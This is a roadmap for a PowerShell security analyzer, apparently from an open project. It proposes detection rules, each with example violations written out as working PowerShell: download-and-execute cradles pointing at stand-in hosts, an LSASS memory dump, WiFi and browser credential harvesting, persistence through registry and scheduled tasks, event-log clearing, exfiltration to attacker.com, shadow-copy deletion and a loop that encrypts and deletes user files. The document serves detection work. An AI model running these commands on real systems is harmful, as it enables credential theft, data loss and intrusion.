# PowerShell-Specific Security Rules and Test Suggestions

> Generated on October 24, 2025

## Overview

This document provides additional PowerShell-specific security rules, tests, and suggestions that could be considered for future phases of the PowerShell Testing Suite (PSTS) project. These suggestions focus on emerging threats, advanced PowerShell features, and real-world attack patterns observed in the wild.

---

## 🎯 **Advanced PowerShell Security Rules**

### **1. PowerShell Obfuscation Detection**

**Priority**: High  
**Category**: Malware Detection / Code Obfuscation

**Description**: Detect obfuscated PowerShell code that attackers use to evade detection and analysis.

**Patterns to Detect**:
- Base64 encoded commands: `-EncodedCommand`, `[Convert]::FromBase64String()`
- String concatenation obfuscation: `'P'+'owe'+'rSh'+'ell'`
- Character code conversion: `[char]0x50+[char]0x6F+[char]0x77...`
- Format string obfuscation: `"{0}{1}{2}" -f 'Get','-','Process'`
- Variable name randomization with invoke operators: `&$randomVar`
- Compression-based obfuscation: `[System.IO.Compression.GZipStream]`
- XOR encryption patterns
- Reversed strings: `'llehSrewoP'[-1..-10] -join ''`

**Example Violations**:
```powershell
# Base64 encoded command
$encoded = "R2V0LVByb2Nlc3M="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# String concatenation obfuscation
$cmd = 'In' + 'vok' + 'e-Ex' + 'pres' + 'sion'
& $cmd "(Get-Process)"

# Character code obfuscation
$chars = 73,110,118,111,107,101,45,87,101,98,82,101,113,117,101,115,116
$cmdlet = -join ($chars | ForEach-Object { [char]$_ })
```

**Suggested Test Script**: `powershell-obfuscation.ps1`

---

### **2. PowerShell Download Cradle Detection**

**Priority**: Critical  
**Category**: Malware Delivery / Remote Code Execution

**Description**: Detect common "download cradle" patterns used to download and execute malicious payloads from the internet.

**Patterns to Detect**:
- `IEX (New-Object Net.WebClient).DownloadString('http://...')`
- `Invoke-Expression (Invoke-WebRequest -Uri '...' -UseBasicParsing).Content`
- `powershell -c "IEX(IWR('url'))"`
- `curl | iex` style patterns
- BitsTransfer downloads followed by execution
- Certificate validation bypass + web request + execution
- Memory-only execution patterns (fileless malware)

**Example Violations**:
```powershell
# Classic download cradle
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

# Shortened version
IEX(IWR 'http://evil.com/script.ps1')

# BitsTransfer cradle
Start-BitsTransfer -Source 'http://bad.com/tool.exe' -Destination $env:TEMP\tool.exe
& "$env:TEMP\tool.exe"

# Memory-only execution
[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://evil.com/payload.dll'))
```

**Suggested Test Script**: `download-cradle-patterns.ps1`

---

### **3. PowerShell Persistence Mechanisms**

**Priority**: High  
**Category**: Persistence / Backdoor Detection

**Description**: Detect PowerShell commands that establish persistence on a system.

**Patterns to Detect**:
- Registry Run keys modifications: `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
- Scheduled task creation with PowerShell payloads: `Register-ScheduledTask`
- WMI event subscriptions: `Register-WmiEvent`, `__EventFilter`, `__EventConsumer`
- PowerShell profile modifications: `$PROFILE`
- Startup folder script placement
- Service creation with PowerShell commands
- DLL hijacking via PowerShell

**Example Violations**:
```powershell
# Registry persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -WindowStyle Hidden -File C:\malware.ps1"

# Scheduled task persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\backdoor.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger

# WMI persistence
$FilterArgs = @{Name='BadFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs
```

**Suggested Test Script**: `persistence-mechanisms.ps1`

---

### **4. PowerShell Credential Harvesting**

**Priority**: Critical  
**Category**: Credential Theft / Data Exfiltration

**Description**: Detect PowerShell commands commonly used for credential harvesting and theft.

**Patterns to Detect**:
- Mimikatz invocation patterns
- LSASS process memory dumping: `Get-Process lsass`, `rundll32.exe`
- SAM/SYSTEM registry hive access
- Credential Manager enumeration: `[Security.Credentials.CredentialManager]`
- Browser credential extraction
- WiFi password dumping: `netsh wlan show profiles`
- Kerberos ticket extraction
- DPAPI credential decryption

**Example Violations**:
```powershell
# LSASS dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# WiFi password harvest
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profile = $_.ToString().Split(":")[1].Trim()
    netsh wlan show profile name="$profile" key=clear
}

# Credential Manager access
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll()

# Browser credential theft
Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
```

**Suggested Test Script**: `credential-harvesting.ps1`

---

### **5. PowerShell Anti-Analysis Techniques**

**Priority**: Medium-High  
**Category**: Evasion / Anti-Forensics

**Description**: Detect techniques used to evade analysis, debugging, and forensic investigation.

**Patterns to Detect**:
- VM/sandbox detection: `Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer`
- Debugger detection
- Analysis tool detection (Process Monitor, Wireshark, etc.)
- Time-based evasion (sleep/delay before execution)
- Event log clearing: `Clear-EventLog`
- PowerShell history clearing: `Clear-History`, removing PSReadLine history
- Transcript bypass attempts
- Domain/user environment checks

**Example Violations**:
```powershell
# VM detection
$manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
if ($manufacturer -match "VMware|VirtualBox|Hyper-V|QEMU") {
    exit
}

# Analysis tool detection
$processes = Get-Process
if ($processes.Name -match "procmon|wireshark|fiddler|processhacker") {
    exit
}

# Event log clearing
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell history clearing
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History
```

**Suggested Test Script**: `anti-analysis-techniques.ps1`

---

### **6. PowerShell Lateral Movement**

**Priority**: High  
**Category**: Network Propagation / Privilege Escalation

**Description**: Detect PowerShell commands used for lateral movement across networks.

**Patterns to Detect**:
- PSExec-style remote execution
- WMI/CIM remote command execution: `Invoke-WmiMethod`, `Invoke-CimMethod`
- Remote scheduled task creation
- Remote service installation
- SMB/Admin share enumeration and access
- Pass-the-Hash techniques
- WinRM abuse beyond normal remoting

**Example Violations**:
```powershell
# WMI remote execution
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command {malicious command}" -ComputerName "RemotePC"

# Remote scheduled task
$session = New-PSSession -ComputerName "RemotePC"
Invoke-Command -Session $session -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\payload.ps1"
    Register-ScheduledTask -TaskName "Update" -Action $action
}

# SMB share enumeration
Get-ChildItem "\\RemotePC\C$" -Recurse
Get-ChildItem "\\RemotePC\Admin$"
```

**Suggested Test Script**: `lateral-movement.ps1`

---

### **7. PowerShell Data Exfiltration**

**Priority**: High  
**Category**: Data Loss Prevention / Exfiltration

**Description**: Detect PowerShell commands used to exfiltrate sensitive data from systems.

**Patterns to Detect**:
- Large file uploads to external services
- DNS tunneling: excessive DNS queries with data encoding
- ICMP tunneling
- HTTP POST with suspicious data volumes
- Email exfiltration via SMTP
- Cloud storage uploads (OneDrive, Dropbox, Google Drive)
- Pastebin/GitHub Gist uploads
- Data encoding before transmission (Base64, hex, etc.)

**Example Violations**:
```powershell
# HTTP POST exfiltration
$data = Get-Content "C:\sensitive\data.txt"
$body = @{data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))}
Invoke-RestMethod -Uri "http://attacker.com/receive" -Method Post -Body $body

# DNS exfiltration
$data = Get-Content "C:\secrets.txt"
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
foreach ($chunk in ($encoded -split '(.{32})' | Where-Object {$_})) {
    Resolve-DnsName "$chunk.attacker.com" -Type A
}

# Email exfiltration
$attachment = "C:\confidential\report.xlsx"
Send-MailMessage -To "attacker@evil.com" -From "employee@company.com" -Subject "Data" -Attachments $attachment -SmtpServer "smtp.company.com"

# Pastebin exfiltration
$secrets = Get-Content "C:\passwords.txt" -Raw
$body = @{api_paste_code = $secrets; api_paste_name = "backup"}
Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body $body
```

**Suggested Test Script**: `data-exfiltration.ps1`

---

### **8. PowerShell Crypto-Mining Detection**

**Priority**: Medium  
**Category**: Resource Abuse / Malware

**Description**: Detect PowerShell commands related to cryptocurrency mining malware.

**Patterns to Detect**:
- Mining pool connections (common mining pool domains/IPs)
- CPU/GPU intensive process spawning
- Mining software download and execution (XMRig, CGMiner, etc.)
- Wallet address patterns in code
- Stratum protocol usage
- High CPU priority processes launched by PowerShell

**Example Violations**:
```powershell
# Mining software download and execution
$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.0.0/xmrig-6.0.0-linux-x64.tar.gz"
Invoke-WebRequest -Uri $minerUrl -OutFile "$env:TEMP\miner.tar.gz"
Start-Process -FilePath "$env:TEMP\miner\xmrig.exe" -ArgumentList "--donate-level 1 -o pool.minexmr.com:4444 -u WALLET_ADDRESS"

# In-memory mining
$miningCode = (New-Object Net.WebClient).DownloadString('http://coinhive.com/lib/coinhive.min.js')
Add-Type -TypeDefinition $miningCode
```

**Suggested Test Script**: `crypto-mining-detection.ps1`

---

### **9. PowerShell Ransomware Indicators**

**Priority**: Critical  
**Category**: Malware / Data Destruction

**Description**: Detect PowerShell commands indicative of ransomware behavior.

**Patterns to Detect**:
- Recursive file encryption patterns
- File extension modifications (bulk rename operations)
- Volume Shadow Copy deletion: `vssadmin delete shadows`
- Backup deletion commands
- Ransom note file creation patterns
- Mass file operations across network shares
- System restore point deletion

**Example Violations**:
```powershell
# Shadow copy deletion
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Recursive file encryption simulation
Get-ChildItem -Path "C:\Users" -Recurse -File | ForEach-Object {
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content) {
        $encrypted = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
        Set-Content -Path "$($_.FullName).encrypted" -Value $encrypted
        Remove-Item $_.FullName -Force
    }
}

# Ransom note creation
$note = "Your files have been encrypted! Pay 1 BTC to recover..."
Get-ChildItem -Path "C:\" -Recurse -Directory | ForEach-Object {
    Set-Content -Path "$($_.FullName)\READ_ME.txt" -Value $note
}

# Backup deletion
Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }
```

**Suggested Test Script**: `ransomware-indicators.ps1`

---

### **10. PowerShell Privilege Enumeration**

**Priority**: Medium  
**Category**: Privilege Escalation / Reconnaissance

**Description**: Detect PowerShell commands used to enumerate system privileges and identify escalation opportunities.

**Patterns to Detect**:
- Token privilege enumeration
- User rights assignment queries
- Privileged group membership checks
- UAC status checks
- Integrity level queries
- Running service account enumeration
- Scheduled task enumeration for privilege context

**Example Violations**:
```powershell
# Privilege enumeration
whoami /priv
whoami /groups

# UAC status check
$uac = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA"
if ($uac.EnableLUA -eq 0) {
    Write-Host "UAC is disabled"
}

# Admin check
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Service account enumeration
Get-WmiObject Win32_Service | Where-Object {$_.StartName -notmatch "LocalSystem|NT AUTHORITY"} | Select-Object Name, StartName
```

**Suggested Test Script**: `privilege-enumeration.ps1`

---

## 🔧 **Testing Infrastructure Improvements**

### **1. Automated Test Script Validation**

Create a test harness that:
- Automatically runs the analyzer against all test scripts
- Validates that expected violations are detected
- Ensures no false negatives
- Tracks detection rate metrics
- Generates test coverage reports

### **2. Performance Benchmarking**

Implement performance tests:
- Analysis speed for large files (1MB+, 10MB+)
- Scalability tests with hundreds of scripts
- Memory usage profiling
- Rule execution time tracking

### **3. False Positive Database**

Create a database of known false positives:
- Common patterns that trigger rules but are safe
- Whitelisting mechanisms
- Context-aware suppression
- Community-contributed suppressions

### **4. Integration Test Suite**

Comprehensive integration tests:
- End-to-end GitHub Actions workflow testing
- SARIF format validation
- Auto-fix application verification
- Multi-platform testing (Windows/Linux/macOS)

---

## 📊 **Advanced Analysis Features**

### **1. Behavior-Based Analysis**

Beyond pattern matching:
- Track data flow through scripts
- Identify suspicious behavioral chains
- Context-aware violation severity
- Intent analysis

### **2. Machine Learning Enhancement**

ML-powered features:
- Anomaly detection for unusual patterns
- Classification of malicious vs. benign code
- False positive prediction
- Automated rule generation from samples

### **3. Interactive Analysis Mode**

Developer-friendly features:
- Explain why code was flagged
- Show attack scenarios
- Suggest secure alternatives
- Provide educational content

---

## 🌐 **Real-World Attack Pattern Database**

### **Suggested Test Scripts Based on Real Malware**

1. **Empire Framework Patterns** - Test for PowerShell Empire indicators
2. **Covenant C2 Detection** - Command and control framework patterns
3. **Metasploit PowerShell Payloads** - Common Metasploit signatures
4. **Living off the Land Binaries (LOLBins)** - Detect LOLBin abuse
5. **PowerShell-based APT Techniques** - Nation-state actor patterns
6. **Fileless Malware Patterns** - Memory-only execution techniques
7. **PowerShell Supply Chain Attacks** - Compromised module detection

---

## 🎓 **Educational Components**

### **Security Training Integration**

- Link violations to MITRE ATT&CK techniques
- Provide secure coding examples for each rule
- Create interactive tutorials
- Gamification with security challenges
- Certification program for secure PowerShell development

---

## 🔐 **Enterprise Features**

### **1. Policy Compliance**

- CIS PowerShell Security Benchmark compliance
- NIST guidelines mapping
- Industry-specific security policies
- Custom organizational rules

### **2. Audit and Governance**

- Detailed audit logs
- Compliance reporting
- Policy violation tracking
- Exemption workflow

### **3. Integration Enhancements**

- SIEM integration (Splunk, Azure Sentinel)
- Ticketing system integration (Jira, ServiceNow)
- Security orchestration (SOAR platforms)
- Threat intelligence feeds

---

## 📈 **Metrics and KPIs**

Track success with:
- Vulnerability detection rate
- False positive rate
- Time to remediation
- Developer adoption rate
- Security posture improvement
- Code quality trends

---

## 🚀 **Future Vision**

### **PowerShell Security Platform**

Transform PSTS into a comprehensive platform:
- Cloud-based analysis service
- API for third-party integrations
- Marketplace for community rules
- Real-time threat intelligence
- Collaborative security analysis
- Automated remediation orchestration

---

## 📝 **Implementation Priority**

### **Phase 1.5D (Next Immediate)**
1. PowerShell Obfuscation Detection
2. Download Cradle Detection
3. Credential Harvesting Detection
4. Ransomware Indicators

### **Phase 1.5E (Short-term)**
1. Persistence Mechanisms
2. Lateral Movement Detection
3. Data Exfiltration Detection
4. Anti-Analysis Techniques

### **Phase 1.5F (Medium-term)**
1. Crypto-Mining Detection
2. Privilege Enumeration
3. Testing Infrastructure Improvements
4. ML-Enhanced Analysis

---

## 🤝 **Community Contributions**

Encourage community involvement:
- Open source rule repository
- Bug bounty program for false positives/negatives
- Community-driven test scripts
- Security research partnerships

---

**This document should be regularly updated as new PowerShell attack techniques emerge and as the PSTS project evolves.**

*Last Updated: October 24, 2025*
